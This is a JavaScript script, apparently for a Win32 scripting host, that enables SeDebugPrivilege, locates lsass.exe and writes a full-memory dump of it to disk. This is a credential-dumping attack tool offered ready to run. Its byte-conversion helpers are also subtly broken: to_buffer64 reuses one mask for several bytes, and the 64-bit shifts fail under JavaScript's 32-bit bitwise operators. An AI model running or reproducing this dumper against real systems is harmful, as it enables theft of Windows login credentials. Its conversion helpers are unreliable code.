import * as win32 from 'Win32';

/**
 * Helper functions
 */
function to_int32(x) {
    var val = 0;
    val = x[0] | (x[1] << 8) | (x[2] << 16) | (x[3] << 24);
    return val;
}

function to_int64(x) {
    var val = 0;
    val = x[0] | (x[1] << 8) | (x[2] << 16) | (x[3] << 24) | (x[4] << 32) | (x[5] << 40) | (x[6] << 48) | (x[7] << 56);
    return val;
}

function to_buffer64(x) {
    var buffer = new Array(8);
    buffer[0] = x & 0xff;
    buffer[1] = (x & 0xff00) >> 8;
    buffer[2] = (x & 0xff00) >> 16;
    buffer[3] = (x & 0xff00) >> 24;
    buffer[4] = (x & 0xff0000) >> 32;
    buffer[5] = (x & 0xff000000) >> 40;
    buffer[6] = (x & 0xff00000000) >> 48;
    buffer[7] = (x & 0xff0000000000) >> 56;
    return buffer;
}

function to_buffer32(x) {
    var buffer = new Array(4);
    buffer[0] = x & 0xff;
    buffer[1] = (x & 0xff00) >> 8;
    buffer[2] = (x & 0xff0000) >> 16;
    buffer[3] = (x & 0xff000000) >> 24;
    return buffer;
}

function to_string(array) {
    var result = "";
    for (var i = 0; i < array.length; i++) {
        if (array[i] == 0x00)
            break;
        result += String.fromCharCode(array[i]);
    }
    return result;
}

function deserialize(object, buffer) {
    var offset = 0;
    var result = {}
    for (const name in object) {
        var value = object[name];
        if (name.startsWith('p_')) {
            if (pointer_size == 4) {
                result[name] = to_int32(buffer.slice(offset, offset + pointer_size));
                offset += 4;
            }
            else {
                result[name] = to_int64(buffer.slice(offset, offset + pointer_size));
                offset += pointer_size;
            }
        }
        else if (name.startsWith('dw_')) {
            result[name] = to_int32(buffer.slice(offset, offset + 4));
            offset += 4;
        }
        else if (value instanceof Array) {
            var array_value = buffer.slice(offset, offset + value.length);
            
            result[name] = array_value;
            offset += value.length;
        }
        else if (typeof value === "string") {            
            result[name] = to_string(buffer.slice(offset));
            offset += result[name].length;
        }
    }
    return result;
}

function serialize(object) {
    var buffer = new Array();
    for (const name in object) {
        var value = object[name];
        if (name.startsWith('p_')) {
            if (pointer_size == 4) {
                buffer = buffer.concat(to_buffer32(value));
            }
            else {
                buffer = buffer.concat(to_buffer64(value));
            }
        }
        else if (name.startsWith('dw_')) {
            buffer = buffer.concat(to_buffer32(value));
        }
        else if (value instanceof Array) {
            buffer = buffer.concat(value);
        }
        else if (typeof value === "string") {
            for (var i = 0; i < value.length; i++) {
                var t = value.charCodeAt(i);
                buffer = buffer.concat(t);
            }
        }
    }
    return buffer;
}

/**
 * Main code
 */

// global vars
var pointer_size = 8; // we suppose to run in 64-bit mode

var process_entry32 = {
    "dw_dwSize": 0x238, // set PROCESSENTRY32 size (0x128 for x86, 0x238 for x64)
    "dw_cntUsage": 0,
    "dw_th32ProcessID": 0,
    "p_th32DefaultHeapID": 0,    
    "dw_th32ModuleID": 0,
    "dw_cntThreads": 0,
    "dw_th32ParentProcessID": 0,
    "dw_pcPriClassBase": 0,
    "dw_dwFlags": 0,
    "dw_padding": 0, // this is only present for x64 process
    "szExeFile": new Array(260)
}

function adjust_privileges(kernel32) {
    var advapi32 = win32.LoadLibrary("Advapi32.dll");
    var LookupPrivilegeValueA = win32.GetProcAddress(advapi32, "LookupPrivilegeValueA");
    var AdjustTokenPrivileges = win32.GetProcAddress(advapi32, "AdjustTokenPrivileges");

    var OpenProcessToken = win32.GetProcAddress(kernel32, "OpenProcessToken");
    var GetCurrentProcess = win32.GetProcAddress(kernel32, "GetCurrentProcess");
    var CloseHandle = win32.GetProcAddress(kernel32, "CloseHandle");
    var GetLastError = win32.GetProcAddress(kernel32, "GetLastError");

    var p_hToken = new Array(pointer_size);    
    var lpLuid = new Array(8);

    if (!OpenProcessToken(GetCurrentProcess(), 0x20 | 0x8, p_hToken)) {
        print("Error OpenProcessToken: " + GetLastError());
        return;
    }

    if (!LookupPrivilegeValueA(0, "SeDebugPrivilege", lpLuid)) {
        print("Error LookupPrivilegeValueA: " + GetLastError());
        return;
    }

    // compose TOKEN_PRIVILEGES
    var sTP = new Array(0x10);

    // set sTP.Privileges[0].Luid
    sTP[4] = lpLuid[0];
    sTP[5] = lpLuid[1];
    sTP[6] = lpLuid[2];
    sTP[7] = lpLuid[3];
    sTP[8] = lpLuid[4];
    sTP[9] = lpLuid[5];
    sTP[10] = lpLuid[6];
    sTP[11] = lpLuid[7];

    // set sTP.PrivilegeCount = 1;
    sTP[0] = 0x01;
    sTP[1] = 0x00;
    sTP[2] = 0x00;
    sTP[3] = 0x00;

    // sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    sTP[12] = 0x02;
    sTP[13] = 0x00;
    sTP[14] = 0x00;
    sTP[15] = 0x00;

    var hToken = to_int64(p_hToken);
    if (!AdjustTokenPrivileges(hToken, 0, sTP, sTP.length, 0, 0)) {
        print("Error AdjustTokenPrivileges: " + GetLastError());
        return;
    }

    CloseHandle(hToken);
}

function dump_process(target_process) {
    var result = 0;
    var kernel32 = win32.LoadLibrary("kernel32.dll");
    var dbghelp = win32.LoadLibrary("dbghelp.dll");

    adjust_privileges(kernel32);

    var CreateToolhelp32Snapshot = win32.GetProcAddress(kernel32, "CreateToolhelp32Snapshot");
    var Process32First = win32.GetProcAddress(kernel32, "Process32First");
    var Process32Next = win32.GetProcAddress(kernel32, "Process32Next");
    var CloseHandle = win32.GetProcAddress(kernel32, "CloseHandle");
    var OpenProcess = win32.GetProcAddress(kernel32, "OpenProcess");    
    var CreateFileA = win32.GetProcAddress(kernel32, "CreateFileA");
    var GetLastError = win32.GetProcAddress(kernel32, "GetLastError");
    var Sleep = win32.GetProcAddress(kernel32, "Sleep");
    var MiniDumpWriteDump = win32.GetProcAddress(dbghelp, "MiniDumpWriteDump");

    var snapshot = CreateToolhelp32Snapshot(0x00000002, 0);
    if (!snapshot) {
        print("Unable to create system snapshot");
        return;
    }
        
    var pe32_buffer = serialize(process_entry32);    
    result = Process32First(snapshot, pe32_buffer);

    do {
        process_entry32 = deserialize(process_entry32, pe32_buffer);
        
        var process_name = to_string(process_entry32["szExeFile"]);
        var process_id = process_entry32["dw_th32ProcessID"];
        print(process_name);
        if (process_name == target_process) {
            print("Process '" + process_name + "' found, PID: " + process_id);
            var dump_file = process_name + ".dmp";
            
            var hProcess = OpenProcess(
                0x001fffff, // PROCESS_ALL_ACCESS 
                0,
                process_id
            );
            if (!hProcess) {
                print("OpenProcess error: " + GetLastError());
                return;
            }

            var hFile = CreateFileA(
                dump_file,
                0x10000000, // GENERIC_ALL
                0,
                0,
                2, // CREATE_ALWAYS
                0x00000080, // FILE_ATTRIBUTE_NORMAL
                0
            );
            if (hFile == -1) {
                print("CreateFileA error: " + GetLastError());
                return;
            }
                
            if (!MiniDumpWriteDump(
                hProcess,
                process_id,
                hFile,
                0x00000002, // MiniDumpWithFullMemory  
                0,
                0,
                0
            )) {
                print("MiniDumpWriteDump error: " + GetLastError());
                return;
            }

            print("Process dumped to file: " + dump_file);
            CloseHandle(hProcess);
            break;
        }
    } while (Process32Next(snapshot, pe32_buffer));

    CloseHandle(snapshot);
    return;
}

print("-=[ Start Process Dumper ]=-");
dump_process("lsass.exe");
